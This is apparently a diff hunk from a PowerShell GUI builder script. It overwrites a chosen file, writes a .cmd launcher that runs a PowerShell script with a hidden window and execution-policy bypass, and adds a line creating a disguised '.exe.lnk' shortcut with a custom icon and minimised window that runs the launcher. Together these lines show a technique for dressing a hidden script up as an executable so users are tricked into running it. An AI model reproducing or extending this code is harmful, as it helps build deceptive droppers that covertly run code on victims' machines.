@@ -192,6 +192,7 @@ Remove-Item -path $textbox2.text -force
 Add-Content $textbox2.text $ctf1
 Add-Content $textbox2.text $ctf2
 "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -ep bypass -file $(name $($textbox2.text)).ps1" | out-file "$(path $($textbox2.text))\$(name $($textbox2.text)).cmd" -encoding ascii
+link "$(path $($textbox2.text))\$(name $($textbox2.text)).exe.lnk" "cmd /c $(name $($textbox2.text)).cmd" "" $textbox3.text "" $checkbox6.checked 7
        })
         
         dialog show $MyForm
